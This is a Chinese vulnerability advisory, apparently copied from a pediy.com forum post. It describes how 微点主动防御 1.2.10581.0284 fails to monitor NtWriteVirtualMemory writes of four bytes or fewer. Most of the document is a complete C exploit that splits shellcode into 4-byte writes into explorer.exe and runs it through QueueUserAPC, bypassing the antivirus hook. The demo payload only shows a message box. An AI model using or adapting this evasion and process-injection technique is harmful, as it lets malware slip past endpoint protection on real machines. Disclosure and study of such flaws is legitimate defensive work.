
# 微点主动防御 1.2.10581.0284 绕过安全限制漏洞

> 原文：[`www.pediy.com/kssd/pediy11/114532.html`](https://www.pediy.com/kssd/pediy11/114532.html)

## 漏洞概述

**涉及产品**：微点主动防御 `1.2.10581.0284` 版本，其他版本尚未关注。

**影响**：通过此漏洞可以让攻击者绕过微点对 `NtWriteVirtualMemory` 函数的监控，从而能写任意进程的 `ring3` 内存空间，为 `DLL` 注入等恶意行为铺路。

## 漏洞原理

微点主动防御软件为了有效防止恶意进程写其他进程的内存空间，`inlinehook` 了系统函数 `NtWriteVirtualMemory`。但在处理 `NtWriteVirtualMemory` 的第四个参数 `BufferSize` 时，未对 `BufferSize<=4` 的写入情况进行控制，导致此情景发生。

## 利用代码

**操作系统**：`win7`，`winXP`

```c
#include <stdio.h>

#include <windows.h>

#include <Tlhelp32.h>

#define   _WIN32_WINNT   0x0400

#define NO_WIN32_LEAN_AND_MEAN

typedef HANDLE (*_stdcall *OPENTHREAD) (DWORD dwFlag, BOOL bUnknow, DWORD dwThreadId); 

int main ()

{

int i;

BOOL bFlag;

BYTE * lpBuf;

THREADENTRY32 th32; 

PROCESSENTRY32   procentry;

HANDLE hProcess, hSnapShot, hThread, hThreadSnap;

DWORD dwSize, dwWritten, dwProcessID, lpMessageBox;

HMODULE hDll;

OPENTHREAD lpfnOpenThread;

BYTE shellcode[] = "\x8b\xf6\x55\x8b\xec\x6a\x00\x6a\x00\x6a\x00\x6a\x00" 

   "\xE8" 

   "\x71\xea\xba\x75" 

   "\x5d\xC2\x04\x00\x90\x90"; 

dwSize = 4;

lpMessageBox = GetProcAddress(LoadLibrary("User32.dll"), "MessageBoxA"); 

lpfnOpenThread = (OPENTHREAD)GetProcAddress(LoadLibrary("kernel32.dll"), "OpenThread");   

hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 

procentry.dwSize = sizeof(PROCESSENTRY32); 

bFlag= Process32First(hSnapShot, &procentry); 

while(bFlag) 

{ 

   if(stricmp(procentry.szExeFile, "explorer.exe")==0) 

   {

    dwProcessID = procentry.th32ProcessID;

    break;

   }

   bFlag=Process32Next(hSnapShot,&procentry); 

} 

printf("explore.exe pid:%d\n", dwProcessID);

    hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, dwProcessID );

    lpBuf = VirtualAllocEx( hProcess, NULL, 24, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

    if ( NULL == lpBuf )

    {

        CloseHandle( hProcess );

        return FALSE;

    }

printf ("VirtualAllocEx : %x\n", lpBuf);

*(signed long *)(shellcode + 14) = lpMessageBox - (signed long)lpBuf - 18;

for (i = 0; i < 6; i++)

{

   if( WriteProcessMemory( hProcess, lpBuf + i * 4, shellcode + i * 4, dwSize, &dwWritten ) )

   {

    if ( dwWritten != dwSize )

    {

     VirtualFreeEx( hProcess, lpBuf, 24, MEM_DECOMMIT );

     CloseHandle( hProcess );

     printf ("WriteProcessMemory Error!\n");

     return FALSE;

    }

   }

}

hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwProcessID);   

if (hThreadSnap == INVALID_HANDLE_VALUE) 

{ 

   CloseHandle( hProcess );

   return FALSE;

}   

th32.dwSize = sizeof(THREADENTRY32); 

if (!Thread32First(hThreadSnap, &th32)) 

{ 

   CloseHandle(hThreadSnap);

   CloseHandle(hProcess);

   return FALSE; 

}   

do 

{

   if (th32.th32OwnerProcessID == dwProcessID) 

   { 

    printf("ThreadID: %ld\n", th32.th32ThreadID); //显示找到的线程的 ID 

    hThread = lpfnOpenThread(THREAD_ALL_ACCESS, FALSE, th32.th32ThreadID);

    if (!QueueUserAPC(lpBuf, hThread, NULL))

    {

     printf ("QueueUserApc error %x\n", GetLastError());

    }

   } 

}while(Thread32Next(hThreadSnap, &th32)); 

CloseHandle(hThreadSnap);

    CloseHandle( hProcess );

    return TRUE;

}
```
